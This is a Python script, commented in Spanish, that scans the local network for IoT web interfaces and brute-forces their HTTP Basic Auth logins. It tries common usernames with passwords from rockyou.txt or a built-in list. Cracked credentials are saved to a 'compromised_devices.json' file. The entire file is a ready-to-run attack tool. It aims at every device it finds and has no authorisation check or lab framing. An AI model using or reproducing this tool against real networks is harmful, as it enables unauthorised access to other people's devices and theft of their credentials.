#!/usr/bin/env python3
"""
REAL DICTIONARY ATTACK - Ataque de Diccionario para Fuerza Bruta
Realiza ataques de fuerza bruta contra dispositivos IoT usando wordlist
"""

import requests
import sys
import time
from datetime import datetime
import json
from requests.auth import HTTPBasicAuth
import socket
import ipaddress
import concurrent.futures

def get_local_network():
    """Detecta automáticamente la red local"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        return str(network.network_address) + "/24"
    except:
        return "192.168.1.0/24"

def discover_iot_devices(network_range=None, ports=[80, 443, 8080]):
    """Descubre dispositivos IoT en la red automáticamente"""
    if network_range is None:
        network_range = get_local_network()
    
    print(f"[*] Descubriendo dispositivos IoT en {network_range}...")
    devices = []
    found_ips = set()
    
    def check_device(ip_port_tuple):
        ip, port = ip_port_tuple
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((str(ip), port))
            sock.close()
            if result == 0:
                # Verificar si responde HTTP
                try:
                    url = f"http://{ip}:{port}/"
                    response = requests.get(url, timeout=2)
                    if response.status_code in [200, 401, 403]:
                        return ip, port, True
                except:
                    pass
            return ip, port, False
        except:
            return ip, port, False
    
    network = ipaddress.ip_network(network_range, strict=False)
    hosts = list(network.hosts())
    
    # Limitar escaneo a primeros 100 hosts para velocidad
    hosts_to_scan = hosts[:100]
    
    # Escanear en paralelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for ip in hosts_to_scan:
            for port in ports:
                futures.append(executor.submit(check_device, (ip, port)))
        
        for future in concurrent.futures.as_completed(futures):
            try:
                ip, port, found = future.result()
                if found and str(ip) not in found_ips:
                    found_ips.add(str(ip))
                    devices.append({'ip': str(ip), 'port': port})
                    print(f"  [+] Dispositivo encontrado: {ip}:{port}")
            except:
                pass
    
    return devices

class DictionaryAttack:
    def __init__(self, wordlist_path="rockyou.txt", max_passwords=1000):
        self.wordlist_path = wordlist_path
        self.max_passwords = max_passwords
        self.attempts = 0
        self.found_credentials = []
        
    def load_wordlist(self):
        """Carga la wordlist desde el archivo"""
        passwords = []
        try:
            with open(self.wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
                for i, line in enumerate(f):
                    if i >= self.max_passwords:
                        break
                    password = line.strip()
                    if password:
                        passwords.append(password)
            print(f"[*] Cargadas {len(passwords)} contraseñas de {self.wordlist_path}")
            return passwords
        except FileNotFoundError:
            print(f"[!] Error: No se encontró el archivo {self.wordlist_path}")
            print(f"[*] Usando contraseñas comunes por defecto")
            return self.get_default_passwords()
        except Exception as e:
            print(f"[!] Error al cargar wordlist: {e}")
            return self.get_default_passwords()
    
    def get_default_passwords(self):
        """Retorna lista de contraseñas comunes si no hay wordlist"""
        return [
            "123456", "password", "123456789", "12345678", "12345",
            "1234567", "1234567890", "qwerty", "abc123", "monkey",
            "1234567", "letmein", "trustno1", "dragon", "baseball",
            "iloveyou", "master", "sunshine", "ashley", "bailey",
            "passw0rd", "shadow", "123123", "654321", "superman",
            "qazwsx", "michael", "football", "welcome", "jesus",
            "ninja", "mustang", "password1", "1234", "admin"
        ]
    
    def test_credentials(self, target_ip, username, password, port=80):
        """Prueba credenciales contra el dispositivo"""
        self.attempts += 1
        url = f"http://{target_ip}:{port}/"
        
        try:
            # Intentar autenticación básica HTTP
            response = requests.get(
                url,
                auth=HTTPBasicAuth(username, password),
                timeout=3,
                allow_redirects=False
            )
            
            # Si el código es 200, las credenciales son válidas
            if response.status_code == 200:
                return True, response.status_code
            # Si es 401, credenciales inválidas
            elif response.status_code == 401:
                return False, response.status_code
            # Otros códigos pueden indicar éxito
            elif response.status_code not in [401, 403]:
                return True, response.status_code
            else:
                return False, response.status_code
                
        except requests.exceptions.Timeout:
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            return False, "Connection Error"
        except Exception as e:
            return False, str(e)
    
    def attack_single_user(self, target_ip, username, passwords, port=80):
        """Ataque con un usuario específico"""
        print(f"\n[*] Iniciando ataque contra {target_ip}")
        print(f"[*] Usuario objetivo: {username}")
        print(f"[*] Probando {len(passwords)} contraseñas...\n")
        
        start_time = time.time()
        
        for i, password in enumerate(passwords, 1):
            success, status = self.test_credentials(target_ip, username, password, port)
            
            # Mostrar progreso cada 50 intentos
            if i % 50 == 0 or success:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(f"[*] Intentos: {i}/{len(passwords)} | "
                      f"Velocidad: {rate:.1f} intentos/seg | "
                      f"Última: {password[:20]}")
            
            if success:
                elapsed = time.time() - start_time
                print(f"\n[+] ¡CREDENCIALES ENCONTRADAS!")
                print(f"    IP: {target_ip}")
                print(f"    Usuario: {username}")
                print(f"    Contraseña: {password}")
                print(f"    Status Code: {status}")
                print(f"    Intentos realizados: {i}")
                print(f"    Tiempo transcurrido: {elapsed:.2f} segundos")
                
                credential = {
                    'ip': target_ip,
                    'username': username,
                    'password': password,
                    'port': port,
                    'status_code': status,
                    'attempts': i,
                    'time_elapsed': elapsed,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.found_credentials.append(credential)
                return credential
        
        print(f"\n[-] No se encontraron credenciales válidas")
        print(f"    Intentos totales: {len(passwords)}")
        return None
    
    def attack_multiple_users(self, target_ip, usernames, passwords, port=80):
        """Ataque con múltiples usuarios"""
        print(f"\n[*] Iniciando ataque multi-usuario contra {target_ip}")
        print(f"[*] Usuarios a probar: {', '.join(usernames)}")
        print(f"[*] Contraseñas por usuario: {len(passwords)}\n")
        
        for username in usernames:
            result = self.attack_single_user(target_ip, username, passwords, port)
            if result:
                return result
        
        return None
    
    def save_results(self, filename="compromised_devices.json"):
        """Guarda los resultados en un archivo JSON"""
        if self.found_credentials:
            with open(filename, 'w') as f:
                json.dump({
                    'attack_date': datetime.now().isoformat(),
                    'total_attempts': self.attempts,
                    'compromised_devices': self.found_credentials
                }, f, indent=2)
            print(f"\n[*] Resultados guardados en: {filename}")
        else:
            print(f"\n[-] No hay credenciales para guardar")

def main():
    print("=" * 60)
    print("    REAL DICTIONARY ATTACK - Ataque de Fuerza Bruta")
    print("=" * 60)
    
    # Descubrir dispositivos automáticamente
    devices = discover_iot_devices()
    
    if not devices:
        print("[!] No se encontraron dispositivos IoT en la red.")
        print("[*] Puedes especificar dispositivos manualmente editando el script.")
        return
    
    print(f"\n[*] {len(devices)} dispositivo(s) encontrado(s) para atacar")
    
    # Cargar wordlist
    attacker = DictionaryAttack(wordlist_path="rockyou.txt", max_passwords=1000)
    passwords = attacker.load_wordlist()
    
    if not passwords:
        print("[!] No se pudo cargar ninguna contraseña. Abortando.")
        return
    
    # Usuarios comunes a probar
    common_usernames = ['admin', 'user', 'root', 'guest', 'operator', 'administrator']
    
    # Ejecutar ataques en todos los dispositivos encontrados
    for device in devices:
        print(f"\n{'='*60}")
        print(f"[*] Atacando dispositivo: {device['ip']}:{device['port']}")
        
        # Probar con cada usuario común
        for username in common_usernames:
            result = attacker.attack_single_user(
                device['ip'],
                username,
                passwords[:500],  # Limitar a 500 para velocidad
                device['port']
            )
            
            if result:
                print(f"\n[+] Dispositivo {device['ip']} comprometido exitosamente")
                break  # Si encontramos credenciales, pasar al siguiente dispositivo
        
        time.sleep(1)  # Pausa entre ataques
    
    # Guardar resultados
    attacker.save_results()
    
    # Resumen final
    print(f"\n{'='*60}")
    print("    RESUMEN DEL ATAQUE")
    print(f"{'='*60}")
    print(f"Intentos totales: {attacker.attempts}")
    print(f"Dispositivos comprometidos: {len(attacker.found_credentials)}")
    
    if attacker.found_credentials:
        print("\nCredenciales encontradas:")
        for cred in attacker.found_credentials:
            print(f"  - {cred['ip']}:{cred['port']} - {cred['username']}:{cred['password']}")

if __name__ == "__main__":
    main()

